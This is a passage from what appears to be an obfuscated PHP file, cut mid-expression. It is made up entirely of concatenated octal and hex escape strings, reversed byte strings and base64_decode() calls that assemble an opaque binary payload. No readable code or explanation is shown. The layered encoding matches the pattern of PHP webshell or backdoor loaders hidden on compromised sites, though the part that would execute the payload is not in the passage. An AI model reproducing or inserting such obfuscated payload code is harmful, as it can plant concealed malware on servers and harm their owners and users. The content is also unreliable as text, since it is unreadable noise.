xd9\x10"."\271\343\67\53\77\332\164\314\207\233\117\77\364\276\171\17\75\250\365\37\340\176\241\151\317\223\237\271\323\371\111\170\326\111\216\224\143\370\325\47\102\75\103\376\177\235\372\342\326\53\267\55\162\174\272\252\351".strrev('øœ«ìû<·÷õ÷ÿßÃ…ó{µ—\'Ôu5;¼Ï§ğ¾ånÉ{\\>O~àvÚÙšßZ3¼ßîØ²ä³')."\323\341\256\257\335\277\141\135\61\364\156\337\346\251\363\67\75\121\30\35\71\343\345\360\325\17\77\374\263\370\312\277\16\255\177\47\361\265\115\63\377\64\164\320\47\7\176\377\306\21\305\170\367\203\144\357\63".strrev('{Ğ;/ƒüyÏ“»ş7³…qÀût:_O¶Ñ¢ö¹ÎÇ<‹ËíRÍóMæÒûÿw«‹çÿmôÌ/£ßY'."\r".'').base64_decode('7I86jUtv2mvbX71Hv3to1S/33PNf3c+e+puVHa0HHvPMWxde+Z0NNx111YxLhza33XHBtl8NdnZt')."\xbe\xfe\xac\xcd\xfb\x1c\x35\xd9\xd1\xf4\xc6\x85\x9b\x96\xcf\xfa\xf5\x19\xef\x3d\xbe\xfb\xd8\x5f\x4c\x7e\xb2\xf3\x61\x6d\xe9\xbd\xff\x7c\xe3\xc2\xdd\x47\x1e\x53\xfa\xf2\xd2\xd7\xb7\x1f\xfb\xd1\x7\x3b\x7b\x9e\x72\x7d\xf9\xb7\xa7".strrev('yZo?/ïû=ÏûŞÇƒ§õÿcâı}ß/Å'."\r".'Òğ¼.ÎìùŸïñ¿Ç_óı×»–²ã;ß/ô5´').strrev('8ß+Éò|w²×ÎşdÆ¦Êğ¼Gßvp¾Ùğ|ï›“óúS›·õ¸?eáy»#ÿ“¿‰u‰-²ã')."\xf5\xe2\x2b\xff\x5c\xb8\x69\xe9\xf7\xce\xea\xef\x7f\xff\xd5\x63\xff\x76\x90\xff\xd6\x13\x9e\xbf\xe5\x27\x97\xf6\xed\xff\x6c\xd5\x27\xcf\x8d\xb5\x1f\xdb\x12\x77\xc\xbe\x14\xfb\xb9\x74\xc8\xf2\x9d\x47\x95\x3e\x7f\xf2\xc0\x7\x47"."\376\70\361\307\302\43\367\154\331\266\265\353\312\370\1\127\376\303\345\134\163\356\331\117\205\136\115\155\376\306\373\257\137\225\275\173\333\332\255\67\254\365\35\364\300\325\337\136\367\355\115\107\175\331\260\357\105".base64_decode('m+pmTj195qq9Cv2XLrrsd1uvcfp3H3XEo0+e25R7Jhc4/t97+l2vXfTAd6lO9KLF5PZ/8eJmHCAa')."\x12\x4d\xb\x5a\xc8\x46\x79\x5d\x2a\x5d\xc8\x93\x53\xa2\x5\x8b\xc8\x4d\xcf\x82\x5\xe4\xfc\x60\x41\x3d\x81\x34\x2e\x20\x39\x1b\x9a\x89\x9a\xe8\xe8\x98\xa1\x2b\x9\x22\x7b\x37\x34\x2d\x24\x1\xf2\x53\x4f\xb\x20\xd9\x9b\x48\x60".base64_decode('PKuuyyvkSCuXH53IqiOkSvinpYHkXNhIxNtSIjOamqRHlJlEfmJkHY6QNuXVRDo1StqQMYt5bZSU').strrev('HĞÍÉ"Ş²â|Ñ‰´¦¤f“Õ54ÙÄòj.$E–†I‹[ä™´MõE‰òÚeÆë©)]j@ÜÙ')."\x3b\xd4\x48\xa7\x12\x13\x45\xb2\x3d\x29\x80\x1d\x42\x62\x8a\x5e\xd6\xe9\xa9\x49\x33\x47\x74\x8e\x16\x2d\x5c\x4c\x8b\x24\x5\xb5\x90\x12\xa7\x12\xb2\x3a\x99\x21\xdb\x18\x3d\x53\x1c\x1b\x35\xc8\x5d\x50\x4b\xb\xc9\x33\x56\x1c\x49"."\x98\x5\x52\xd3\x7c\x62\x24\x9b\x19\x27\xa\x50\x46\x66\x72\x9d\x3e\x41\x6e\xac\xa6\xf2\xda\xd8\x38\xdd\x13\x37\x37\xd2\x11\x6f\x22\x5d\x51\x4a\xe7\xa7\x26\x72\xf4\xf0\xd\x6a\x43\x66\xc8\x99\xd1\xc8\xa4\x9c\x4c\x8f\x29\xb4\xf"."\311\110\57\40\203\260\220\165\152\63\111\51\352\245\121\63\105\132\66\241\46\327\115\322\103\215\305\213\26\320\114\344\253\352\224\262\56\125\44\137\235\122\123\243\311\11\22\31\127\307\14\45\113\16\73\122\243"."\x46\x76\x62\x92\x50\x4f\x32\x9f\x9b\x50\x68\x37\x2e\xa6\x84\xb6\x88\x94\x38\x21\x27\x74\xad\x40\xda\x9c\x4a\xe6\xc6\x94\x71\x52\x62\x51\x35\xa6\x72\x9\x52\xc8\x82\x46\x56\x6d\x42\xc1\xcd\x94\xc0\xd5\x54\x66\x72\xac\x44\xfa\x93"."\316\27\71\223\32\313\323\255\135\143\23\201\26\212\23\306\50\123\176\122\47\364\51\106\201\215\55\164\156\261\142\307\164\143\204\134\234\346\213\311\204\61\112\72\270\261\236\364\345\42\332\227\243\143\353\22\262".strrev('j“5eL¡<É@º]qY&ÈÑ}"Ÿ=I³§HÈ›@JBÀ5@‰¹¹z@£	©ãcËÚD¥*ãé(ŸšªF')."\52\214\245\12\351\22\241\27\165\235\61\231\240\367\314\15\55\144\216\114\44\306\223\132\232\120\167\43\351\307\121\145\304\30\243\367\11\315\164\174\344\134\151\324\110\221\175\367\202\6\122\247\226\305\244\32\205".base64_decode('0ZS2ziSjNjZiZlNUxaWF1nRc1nPZJL3CzgBSyU9S1kE+0kQbPWlOpXIyKa6Jfq0kG0qebrEXLFxI')."\77\100\171\327\242\205\164\30\10\44\67\241\146\246\106\11\7\132\114\277\262\210\126\32\36\265\245\22\143\64\123\13\235\313\244\313\344\251\242\122\242\147\3\206\71\245\114\20\332\130\235\47\320\116\71\71\112"."\x8f\x93\xd\x53\x36\x4b\x86\xd\x81\xea\xda\x27\x45\x5d\xcc\x51\x45\xa1\xa\x85\x54\x65\x91\x5f\x9\x1b\x25\xa4\x20\x4c\xd3\xf9\x41\x2\x3c\x81\x11\xae\x8e\x61\x34\x22\xe2\x26\xb\xa6\x90\xc\x62\x96\x54\xa8\xe2\x7\xcf\x3b\x78"."\x8c\x1e\xcc\x47\x4c\x4d\x67\x97\xe9\x58\xe7\xc5\x5\x6b\xe8\xb2\x36\xa8\xbe\xc1\x82\x91\x4a\x58\xd2\x19\x94\x9e\x92\xd8\x53\xd2\x76\x78\x2\x75\x1d\xd3\x28\x80\xff\x91\x86\x61\x6b\xd\x43\x19\x2b\x29\x4c\xe9\x18\x63\xbb\x68\x7f".base64_decode('JYR+xyflpmyMukSwU0xVC+DTuZzLasUDTTroMMW5pihvIb/JFGC8j4WusA6aoDFWpBMWQFOGxbqI')."\260\225\374\24\214\12\141\133\213\135\274\146\65\60\130\133\251\307\205\132\221\266\272\141\133\335\250\100\241\235\142\32\256\5\117\264\215\241\330\244\14\73\131\346\307\234\244\202\274\166\344\26\241\254\43\321\320".strrev('d²f¨dÁ¥*Õ5e¥%8°U’rs®¤¬^G'."\0".'»]üCmY\'¯t$:á!ÆşÈç&ºVBÓ©[')."\x6a\x34\x2c\x56\x4d\xbc\x60\xb4\x35\xc6\x32\xb9\xec\xcd\xb1\x24\x82\x1e\x2f\x31\x7b\xb\x76\xbb\x21\x1e\x84\xa2\x7b\x56\x5e\x67\x1c\x65\xb7\x27\x11\x50\x12\xbb\x1f\xd6\x95\x94\x4a\xd5\xe2\x94\x3c\xc2\xa4\xaa\xa8\xe8\x76\x84\xe9"."\343\45\163\212\254\133\156\146\332\226\26\263\105\150\140\147\56\131\112\314\175\310\225\123\134\370\56\11\163\235\147\21\232\263\337\366\320\371\344\352\352\24\54\341\40\232\220\3\253\371\54\201\74\247\235\103\11".base64_decode('Ry/AcLhUgKlEudwt5Hdx1AmicJcmFeuzth9U2Mm6BDQTsNuUgVSLCNHPIsMhWPdAvS+oPstbC4eQ')."\x53\x59\x5c\x4e\x13\x5b\x3\xbf\x60\x69\x14\xcf\x28\x66\x9c\x30\x74\x32\x16\x9d\x9e\x88\xdf\x1b\xf\x79\xa8\xea\xab\x5c\x2c\xba\xcb\xb\x7\x35\x3\xd\x93\x13\x9a\x6e\xd2\x5a\x97\xa0\x46\x33\x69\x60\x98\x8f\x2d\x6c\xc\x1a\xea".base64_decode('r2iIKQ5EEdSnwPSWjJxM77IMUEm1oDCqKBnsRD7g74x3+YkJG1QHjCdzGuWNgJziKVW4+YgXS/ZW').base64_decode('iwaanpA/HokEhT5oFZgZVLjnd58wxhXv4em/eC9qGBOaTroHGtBBHcqIRAx4AJ15ez1hpie5wFXv').base64_decode('auC44INxqC7aTg1+IlFPuIIxJTayJN1ODCtJht7goOQNBgb6+iPYehDD+4NCOtKGsySLYFKsLxTw')."\x78\x7d\x92\xbf\x3f\x1a\xa4\x6a\xae\x4c\xdb\x17\x29\x38\x47\x58\x9c\x36\x5d\x37\x14\x66\x3c\x49\xf2\xe3\x88\xa8\x84\x2d\x96\xc8\x4a\x22\x33\x67\xc8\x51\x1d\xab\x8a\xd5\xc5\x6a\x62\xb5\x6b\x5d\x31\x63\x98\x4c\xf0\xb5\xe2\x88\x90".base64_decode('pSbURVrUykJsfeqLRFYQFf9g2OMN0FoAMifBoNePA7u33vLmPWft/vGOnadtBgXt2nbCrgvvePOu')."\xcd\x6f\x9d\x78\xff\xce\x1d\x67\xee\xfe\xf9\x59\xbb\xb6\xde\xb4\xeb\xcc\xe3\x49\xd5\xdf\xba\xe9\xce\x37\xef\xff\xc5\xee\xad\xd7\xee\xdc\xf1\xa3\x5d\x17\xdc\xbd\x7b\xdb\x49\x38\xe1\xed\xeb\x6e\xd9\x79\xfa\xb5\xac\x62\xd2\xdb\xe7"."\375\174\327\131\127\357\72\377\346\135\233\167\354\274\347\274\235\367\235\260\363\256\273\34\40\367\333\47\157\336\175\377\216\135\233\56\330\165\345\161\273\156\77\143\327\366\315\73\117\277\174\347\105\327\356\76\353"."\246\235\127\234\270\363\224\315\157\335\164\376\54\73\355\340\370\20\35\5\162\271\355\136\23\63\352\152\160\317\306\214\371\260\127\153\301\157\15\124\230\5\277\124\117\20\120\134\4\132\273\364\173\175\166\5\164".base64_decode('MUqMTuswUUCaZhKMQYxWaTyObBKqp63FBjL0QqWEynT5It6wv9NHVDLZQM1FqoHkzhxAI+GVLMys').strrev('D­CGzÕÕê·m"Z­³’€\\¸*¤m’=ÙÊ¥PUJÊ /”®Z’»"Y+\\*j¥…LÊ4').base64_decode('7IhxDmI3LFURm2GWz/IRR8ISa3DU10pVxdEqUi/er6D2cYxpSLKjhlRYrC7HBSzKMHVZBTxLSjoY')."\x88\xe5\x7\xbf\x16\x5b\xe0\xa4\x8b\xe7\xc0\xe3\x4\x30\xec\x30\xc9\xd3\xdf\x65\xc5\xc4\x26\xc4\xa1\x6a\x49\x2e\xa4\x40\xa\xee\x5f\x71\x98\xab\x6b\xa5\x4\x51\x7a\xad\x90\x88\xb2\x59\x3a\xa3\xdd\xd2\x19\x35\xf3\x9\x8b\x8\xf5".base64_decode('sPHGeqoSNnLA1ZINOlAEioYKQvFoUVwNNAMMDsYHAZYyqkzxkgAnYgl0BCGcDWKFNGTbXYVlK9zO').strrev('ïïç„?atğğHj9"BÉNï*µÌJd*böõÃ\\Ğá–á@†L´ mf­÷\\¡‘¼').base64_decode('hvuwmULE2+vr87gI/8aUgPGhUCO1S9WQ82FQtaX70Ydol0XRV8G8ipuKYeJeKGZIZcjoS8gOTUZZ')."\332\253\261\145\46\51\222\71\62\10\206\243\161\320\1\204\75\13\134\267\132\130\50\104\215\317\222\256\217\263\175\41\226\352\271\334\44\317\347\102\227\222\42\314\61\55\47\301\266\217\232\53\47\250\127\4\120"."\5\370\145\157\260\277\333\117\355\66\272\22\226\264\256\260\37\332\14\222\312\111\264\204\70\277\304\7\221\342\104\212\205\271\261\35\114\140\313\76\210\360\125\37\246\10\316\31\340\147\42\375\54\314\45\113\20"."\x81\x7a\x76\x9c\x3\xf\x76\xb1\x70\x2f\x33\xb9\x82\x9\xc1\xb0\x10\xf1\x84\x3d\x7d\x11\x16\xd\xf\x2\x8e\xe\x61\x82\x69\x51\x9f\x27\x12\x5\xad\xea\x1f\xe8\xe3\x5c\x3f\xe0\x59\x9\x8\x26\xc8\xe5\x12\xca\xb1\x6b\x5c\x75\x4b".strrev('ƒc…Ê8á$4¿Ââ¯„iÈãƒØ x•şq|fâ'."\r".'MC‚ZÆËRëÃçÊƒ2ÏñpØck')."\x2e\x5f\x6c\x46\x48\x80\x8e\x25\x6c\x8d\x25\xf5\x7\x7\x3d\xdc\x3\x81\x90\x80\x21\x44\xfc\x96\xb8\x5f\x2\xf7\x9a\xa1\xd8\x44\xcc\x5\x44\x6\x63\x2d\xb7\x87\xe8\xea\x94\xa8\x30\xe2\x85\x32\x2b\x51\xd4\x27\xb9\x3d\x74\x45\xa5".base64_decode('S4eDBOI5LUPtjAGLpAIE/l1FA4h7kgxgy1jMUfsIbJgRj22IzYs5XdgWBUoyMQevWdy3Cqy6kYjF').base64_decode('kCaOLPJJ6aDNJITnMY60kR+y8WkjPUGiHe1saH0rNvSDfz3RDT7wLwB+AlEweCpDAJM04F/u2wD/')."\xf0\x84\x5a\x49\x44\xf0\xf7\x6f\x0\x7f\x1\x8b\xd9\xe0\xef\xb7\x67\xee\xf4\x45\x7\x7d\x3e\x8c\x40\xc3\xe4\x97\xa3\x2\x96\x43\x9a\x26\xb8\x14\x39\x2a\x48\xed\xa6\xa4\x80\xaf\x3b\x2a\xc1\x38\xfd\x6c\x3c\x5e\x83\x3a\xcf\x39\x3c"."\277\66\36\167\33\3\204\132\230\335\151\115\365\234\206\152\262\212\170\42\136\316\177\55\164\120\116\2\110\353\330\72\376\314\105\6\211\367\204\203\3\41\41\336\353\131\351\357\357\241\61\167\35\15\325\121\213"."\xfe\x2e\x7f\x4\x74\x91\x97\xd2\x20\xf7\xdc\x21\xc6\x89\xc8\x89\x4\x23\x51\xe4\xb5\x10\x74\x17\xe0\xed\x20\x22\x8\xe2\x70\x7\x80\x79\xb3\x75\x8e\x75\xe\xf8\x3\x5d\xa2\xad\x20\x44\x24\x4b\xa\xe2\xeb\x64\x55\x99\x4b\x2b\x47"."\343\310\152\220\106\140\227\323\60\42\57\32\101\175\100\43\270\3\150\14\165\27\215\40\17\41\64\202\32\112\43\160\113\342\353\247\151\140\353\7\266\155\164\77\227\341\112\253\131\171\234\331\300\54\111\45\4"."\363\126\333\111\27\72\305\361\301\161\43\213\4\322\374\222\4\23\73\170\144\46\34\274\270\61\6\220\66\21\16\370\215\255\135\212\244\341\265\224\54\261\131\227\31\125\115\146\246\207\76\112\234\153\200\217\372"."\221\125\215\360\131\262\236\363\223\32\353\236\207\361\216\265\154\53\103\14\140\35\344\127\347\225\265\352\350\101\10\31\301\231\370\47\106\160\143\144\33\103\154\136\252\35\164\201\225\371\331\124\74\316\115\51\115"."\xbd\x24\x28\x87\x32\xc5\x4d\xa4\xaf\x56\x4a\xc0\x14\xb1\x1f\xd1\x21\x12\x28\x87\x5a\x2f\xa1\x65\x9e\xd4\xd9\xd4\x24\x8e\x65\xd5\x37\xa5\x66\x93\xd8\x47\x8a\x5d\x99\x4c\x4\x73\x7d\x34\x7e\x5e\x4b\xaf\x75\x4c\x25\x6f\xc9\x30\x20"."\x58\x2e\xc9\x29\x6e\xad\x23\x33\x7b\x23\x33\xcb\x2d\xb3\x44\xbf\x24\x5d\x9d\xf8\x37\xf\x75\xad\x23\x4a\x8e\xdc\x38\x75\x25\x90\xe\x1e\xd7\xea\x66\xdd\x61\x8\xba\x79\xe8\xf0\x8a\xb7\xf\x3b\x81\xb1\x65\x24\x25\xf9\x59\x95\x5".base64_decode('LA4McA8kqubNgVWW2y/DkyX+kXUqPS1mVSpoIUXPq+h8bJBr8rJ0hQ8bUpdmh/HooLJg9YVSKoAv').base64_decode('hNiIOBsoMnUfhYhAYiIPU08FQ4HyCsqOyCMLKVbPYUqZZaucqWl9cmEqqq1UFXKp1BUc7A8EqRsF')."\xea\x73\x85\xf0\x0\x72\x75\xa\x36\x17\xba\x8b\x46\x4c\x1a\xa8\xdc\x24\x5d\x26\xf5\x19\xa4\x2b\x7\x22\x5c\xee\x68\x6b\x96\x48\x17\x68\x80\x39\x85\x79\xc2\xde\x5e\x20\xea\xc5\xbb\xfd\x40\xe\xf6\xad\x22\xe2\xd4\xf2\x60\x57\x3c"."\22\34\10\323\223\11\30\107\246\17\141\237\167\65\73\51\140\320\156\317\112\73\4\26\27\365\364\124\4\63\101\17\302\21\117\215\207\203\120\52\366\5\272\155\31\42\275\314\143\205\25\26\17\370\373\227\127".strrev('½ÊÁÆuép'."\r".'©°`+k8[[bé› 6ä`÷–ì¯A;Ç‚»ÄBZÌ;>ã{B}ãˆL').base64_decode('NLaxtibmXuqqY/IiHhpB0b8yWDWiFibmdrlIASwApFVmRkxpkLgEimDjS8sXyGq/UXCkAW1JXHbH')."\33\176\174\346\27\217\254\216\260\236\304\12\377\225\322\55\264\203\321\304\223\160\33\62\370\27\22\121\243\112\276\130\21\321\102\174\26\123\10\21\344\122\65\336\103\21\4\22\155\257\60\22\307\130\257\152\255".base64_decode('dCYmS9AClPc3n8UA5OLsipTENzZkDjtF90qw10VWnErYph4B8KNhYYJyYCO9klvtzDtTsWgP9FMR')."\x3b\x9a\x55\x50\xd5\x5\x47\x11\x49\xad\x90\x42\xbe\x31\x8\x6b\x90\x93\xf4\x9e\xa9\x4\xb6\x85\xf4\xdc\x18\x2e\x48\x86\x73\x42\xa5\x5d\x30\x87\x19\x98\x92\xeb\xa0\xb8\x8c\xcc\xa3\xe3\xe2\x4d\xde\x98\xd3\x50\x33\x5\xa7\x9c\xcb".base64_decode('aIAHZ/MUKo9a0rmTkaIGNr3UT54TfEJIw8igcLrWwINp5psFRgwWEykH9im7/Iig2rVKzcRVUTdY').base64_decode('4wQd72DJ9EMfNNywCnJE5J2HrOMSd21GBeHKTBzuegWldcoL8qNc0siPsnN0usTTlXdc6RYuy/h2')."\x98\x78\x1d\x3\x69\x9d\x53\xf4\xfe\x89\xa8\x98\x77\x4e\x41\x25\xf8\xb2\x95\xe\xda\x3f\x89\xae\xd8\x3c\x83\x91\x66\x67\x6f\x9f\xc7\xeb\x4\x1c\xad\x91\xde\x6c\xaf\xce\x3\x32\xe9\x55\x19\x91\xc8\x13\x46\x73\x1c\xba\x1a\x50\xe8".strrev('»ñU]ßJ¡ÀÍ†fVY}éÓí8,Ë0*¨cœºËÁL|@"?bÕe¨î_£%^‚ÊE¿;’')."\253\52\175\167\225\355\273\253\312\277\213\101\66\352\223\213\105\57\166\77\46\362\10\13\50\51\106\50\263\115\303\333\24\361\112\206\10\312\370\256\335\5\222\273\124\3\212\331\51\206\157\360\20\243\360\264\100"."\373\226\342\376\243\113\37\211\162\177\126\20\224\271\20\7\307\220\271\104\167\5\210\134\46\224\100\370\231\3\64\270\354\143\122\217\116\51\333\255\31\106\205\113\55\0\225\360\105\120\11\363\33\11\211\237\12".base64_decode('9LKoGpKcKGh6no4N8ZDEnN0wVzjcXw7e0uGwj9lQ9smTnowSUSAbIx3lmyxqhiJ6WUopyHsHs7SR')."\47\41\163\241\327\245\262\76\112\123\46\235\240\326\66\167\77\206\242\214\122\1\121\20\314\231\60\36\142\156\174\354\165\203\75\350\314\133\274\241\121\17\103\242\77\6\325\142\303\312\71\236\316\35\72\241\323".strrev('Åõ‰ë‹óa)¶G\'QL®[¨;HÁL×s©ÏU+£ŸáÕ^†z‹:$á£a’ÑğAìÃT°S€Eg@')."\242\142\277\232\272\234\116\203\152\13\256\124\54\165\1\337\220\150\323\247\367\341\104\166\265\363\52\172\155\42\211\310\223\230\133\107\67\266\216\211\70\243\124\344\33\263\2\255\42\370\177\117\255\42\311\300\305".base64_decode('mc5QfkFcLAnuXbEMHkKOuChTEXYgyAEWcU/HPFKBbi10alStan0VoNeq1qo5NeC3tspRBYUtFIcj').base64_decode('DAHo21Wtc2pQoJYYeq4jWmeCRxl+6kr2Fktl0xROC5aivoMTv9Hd6J4gPGbpGPwi9zdpXzAm44BH').base64_decode('0lvguMipyRpAxkhM6WU1oTy8r2sBZbmevqOd3MdT29LJfE4iPpnaqxtc9dUSdUDaXj0Q7XYuql7a').base64_decode('MaPNi44NTaUPnvtB/1rYG2cHOTJog3OVRdzW2HR5Ce/Ly+u0AlgXwe4676LKaqX/hcdxz10FxZzQ')."\164\162\172\112\330\56\123\25\314\12\214\53\157\220\351\213\115\126\133\341\201\4\355\241\201\342\124\251\340\364\2\311\301\211\345\235\326\112\13\142\153\275\25\37\372\140\265\342\213\174\25\162\254\270\215\143\161"."\x86\x94\xe7\x41\xec\x5a\xb1\x55\x12\xfd\x6d\xa\xae\x90\x9c\x50\xec\xc0\xf3\x9c\x6e\x8b\x9\xc\x72\x61\xa\x52\x45\xc7\x52\x74\x62\x2c\xb3\xd5\x17\x8e\x86\x13\xc8\x6d\x70\x8a\x80\x59\xa\x96\x73\x53\xa9\x84\x62\xf5\xe0\x68\xf7"."\353\150\357\5\224\5\216\277\123\164\30\71\11\244\161\230\134\120\46\115\47\44\1\47\165\147\121\236\302\347\172\305\252\46\11\65\125\102\31\50\251\51\373\47\321\111\265\263\124\242\37\254\130\250\270\127\240"."\10\250\21\176\126\236\105\152\227\301\130\63\101\335\56\370\13\347\103\345\356\343\300\374\226\32\233\132\27\54\6\377\23\176\113\17\332\113\105\263\235\5\251\173\271\131\356\64\145\25\334\335\43\155\33\34\135"."\x8b\x4f\x3d\x1\xcc\xbb\x91\x31\x1\xca\x63\x2c\x78\xbc\xb6\x16\x67\xa1\xa4\xa1\x78\x9b\x2a\x78\x12\xac\xc0\x53\x53\xca\x38\x5d\x6f\xc9\x72\x2b\xa8\xd8\xb0\x7e\xcf\xd0\x80\xce\xf0\x65\x4e\xf6\x89\xdc\x28\xaf\x70\x2\x5e\x9c\x11"."\252\35\5\365\321\270\164\206\26\146\201\305\47\263\245\302\150\273\220\50\231\232\46\345\345\302\24\331\67\314\65\132\347\32\130\23\152\256\253\71\155\200\10\341\334\314\371\45\134\164\270\73\17\154\270\113\122"."\300\262\14\205\107\350\113\324\5\27\267\160\211\140\205\162\45\346\204\262\210\302\244\206\241\300\100\217\277\137\270\32\23\0\161\157\127\177\334\23\12\125\114\140\162\220\251\46\335\320\351\245\153\204\272\116\116".base64_decode('UuJpU/MZKQmP7NqrILRKMvQkdTRU5SYcFSHwnVabSrJUwyxSGlCDE4VwcnVHm1vtYJ3NzaR1javi').strrev('P\'˜²ÜÚ±Ş§îg°ï}»4‹”µt»ÃW¶?p–M©%¢ÍÚB·'."\r".'>S¶èàó'."\n".'›¯'."\r".'Ë¾á³Ü¹')."\130\243\22\66\333\173\215\263\363\273\212\7\223\236\244\315\45\245\127\56\254\54\317\2\13\167\45\53\45\271\321\276\337\55\270\62\45\7\25\242\246\224\305\375\210\365\314\226\235\12\126\40\220\242\234\34\205".strrev('ç=¸0ìvAÚ¨§’{-‡,n7ı\\\\zÒ)édÍ][{‚Ÿ'."\0".'¸SD«‹àÛÜ„‘vN:™Å4')."\60\260\72\131\77\203\351\126\104\342\20\212\23\350\357\341\31\360\342\316\343\40\161\210\52\350\240\130\154\250\332\125\267\161\243\133\245\67\153\261\52\153\136\27\303\306\361\230\313\212\17\152\116\272\232\41\22".strrev('V=4…ÄÆ²3.~Ş‚È:3¬ºòˆ°Ú £M0îQØ†;ÛÚÕ¯š'."\r".'ÙTµÇ]Ã6é‘G‘‹€')."\x7f\x52\x4b\xc7\x99\xe7\x52\xdc\x8b\x62\xd8\x53\x2c\x8a\x51\xfa\x3c\x3\x74\x42\xe3\xce\xa9\x9\x37\x9b\xdf\x6e\x4\x73\x25\xb9\x56\x2c\x45\x41\xdc\xc5\x6\x87\xd7\x5f\xb6\x4\xa8\x52\x89\xc0\xe3\x80\xfd\x1\x71\x6a\xc4\xe\x7"."\145\61\40\13\264\31\111\135\55\232\26\316\204\35\376\127\41\137\263\43\362\270\214\121\252\44\352\147\274\12\171\316\253\2\234\10\247\20\26\300\253\322\6\131\216\244\53\271\366\52\124\135\43\253\50\40\77"."\142\52\225\76\2\62\126\111\224\37\346\145\326\143\272\251\201\25\215\162\70\352\123\171\40\114\124\353\74\375\253\55\262\322\354\65\370\167\316\154\112\50\310\211\167\16\10\241\110\177\10\361\31\164\270\237\346".strrev('Él‘_ J¡lšÊ’ì'."\n".'/_†Bİê[+jßrçj¨kï˜ßX˜*f±ƒ¥ooÔ½Œ(sÅÄ]ç').strrev('>C­và'."\r".'õëëëš'."\r".'Fœ¥úQO‚X]càràC–s;+¢å%‹ JNûÚ…²tKä').base64_decode('0UoN4QSU+vpW9D9OQMeupEOtKWD+UkZDECYUhaoxExS1UKKiDugv5CCllU70JcJGbYmkwNaRmGJv')."\x69\x80\x1a\x19\x91\x21\xa0\x4b\x0\x9c\xd9\x34\xc\xe4\xd\x30\x1c\xa8\xe5\xb4\x27\xe9\x6d\x2c\x40\xe3\x3\xd\xea\xe1\x2b\xa4\xc8\x7e\x61\x9\x56\x6a\x6f\x17\x3f\xe6\xa2\x3d\x28\x2\xc5\x23\x74\x93\xa5\x59\xbe\xf\xa0\x60\x3d"."\114\262\252\103\200\160\174\1\345\41\301\103\14\214\212\367\232\50\231\51\64\243\130\216\131\320\300\150\77\53\251\22\11\145\265\211\70\137\336\140\364\50\26\103\175\2\267\33\224\130\130\353\111\307\120\306\107"."\x89\x83\xde\xf9\x91\xfb\x36\x64\x75\x32\xaa\xe6\x2c\x66\xd\x71\xa1\x6c\xd1\xb3\x24\xe0\x2f\x50\x5a\xa5\xc3\x8a\x8f\xd0\xc9\x7\xa0\xa0\xe3\xe2\xbd\x87\x1c\x8f\xa1\xb7\x9\xf0\x15\x7e\xeb\xc\xa1\x27\x75\x8d\x1b\x17\x94\x3d\xb9"."\101\143\221\312\167\313\302\311\26\205\115\203\311\16\276\50\304\107\1\370\366\327\313\334\250\10\5\330\223\154\171\74\51\341\111\11\203\373\117\361\62\177\114\242\123\25\354\61\106\270\125\65\210\267\77\356\251"."\211\226\301\132\137\322\163\256\242\256\145\300\110\30\102\275\40\74\124\31\314\320\313\61\53\40\261\6\211\170\42\20\352\107\320\327\14\10\121\261\63\172\260\251\143\154\121\100\215\260\255\206\0\264\352\72\10"."\11\136\346\303\127\4\302\215\307\200\260\155\104\346\114\326\62\340\216\306\12\141\65\373\12\22\242\33\116\223\274\230\41\230\251\20\64\176\137\17\167\376\342\21\251\252\171\11\355\300\336\340\227\167\126\170\31"."\225\221\31\322\116\205\172\64\205\254\151\157\234\262\205\6\316\243\130\260\361\354\150\112\74\170\205\223\246\227\75\312\120\201\72\254\24\120\66\324\150\316\300\2\132\31\227\20\142\350\352\337\205\134\30\162\131"."\xd9\x16\xb5\xab\x7\x20\xfe\x67\x52\x16\x46\xbd\xaf\x15\x98\xe7\x63\xd8\x19\xb8\xf7\x71\xbc\xc2\x17\x48\x26\x96\xc5\x45\x6f\x1a\x5d\xc9\x74\xc6\x6\x62\x44\x57\x6\x50\xf8\xb6\x0\xe9\xcd\x2\x71\x94\xf2\xcd\x3e\x6d\x1d\xe0\x6b"."\xb2\x7b\x81\xab\x5e\xaa\x19\x54\x81\xcc\x35\x61\x48\xfd\x51\xa9\xc5\xd5\xb8\x44\x1a\xc\xe\xb6\x34\xd7\x4a\x40\xfa\xcb\x29\x83\x4a\x62\xb9\x6a\xba\x17\x34\x2d\x74\x35\xb5\x48\x35\xcb\x7b\xa3\x7d\x1\x87\x4\x2d\x9d\xa4\x1e\x20"."\x4d\x6a\xb5\x92\x37\xab\x6b\x79\xc5\xdd\xb8\x10\x1a\x6b\x34\x2f\x68\x72\x2d\x6e\x96\x22\x72\x5a\xd6\x55\x92\x8b\x70\x4f\x6a\x71\x4c\x7e\xe1\xe3\x5b\x71\xa1\xca\x71\x61\xa7\x8d\x5\x0\xca\x75\x91\x36\x2d\xbe\x9f\x1b\x82\xb9\x88".base64_decode('iiSYKegFLzEjUoAgulDizh3iWunAWixEGOa4Enyux3IleOQZlMuDqcinNFwyBFKDUUZYUHk8J757').base64_decode('NKim2AX+UMwYrou5+5SUKndqkzg6hH6QfilU1quF0fn/S7QuNkyVueAHexW+Y3PPDXV1Ozk62yEi').base64_decode('L8fcVzepGPLRyL9Ay6elR+0bRBzGTxjgsBeOAhAdutgKCfg+j6BBsuAyXR5dS5WStMiQJVZMpVeK').strrev('[Z^¨f´¶5°ıcdÆ9:”ÍØ/®w?›6ÒÎ¬0;QBÓFV="Öu¤	4U>&°…2.Õ')."\63\156\40\60\134\12\355\136\152\127\146\251\212\370\125\113\367\316\327\22\43\156\225\154\24\335\204\176\120\335\332\332\152\134\165\265\35\35\174\37\351\206\104\150\51\201\325\31\172\246\54\57\333\22\11\123\144"."\x9d\x79\xb1\x74\x3\x81\x44\x9f\x2a\xfe\xd7\x39\x15\x8c\x4e\x32\xc3\xab\xc7\xff\x36\xa7\xdb\xdf\x45\x3a\x7c\x68\x18\x7\xda\x40\x9f\xac\xe9\x18\xae\xab\x1d\xea\xa8\x0\x61\xf9\x42\xba\x32\x5e\xb1\xc9\xa0\xdf\xd8\x78\xc7\xc8\xb3"."\x58\x31\xb2\xb4\xc5\xe8\x73\x5c\x44\x35\x31\x46\x74\x13\xa9\x1a\x21\x53\x2b\xa4\x4d\xa9\x89\xc5\x62\x29\xe4\x58\x9c\xa9\x84\x13\x8\xf3\x45\x5f\x33\x1b\xc4\x1b\x45\xc\xc\xa0\x8\xb3\x29\x5e\xdb\x90\xec\x4c\xa3\xba\x76\x0\x64"."\246\51\334\346\252\353\230\103\63\243\153\21\112\40\63\147\120\253\256\336\72\366\365\311\156\37\370\307\210\162\36\51\36\335\230\20\144\300\225\235\276\376\250\77\352\367\21\125\370\75\366\233\261\377\114\322\7".strrev('é8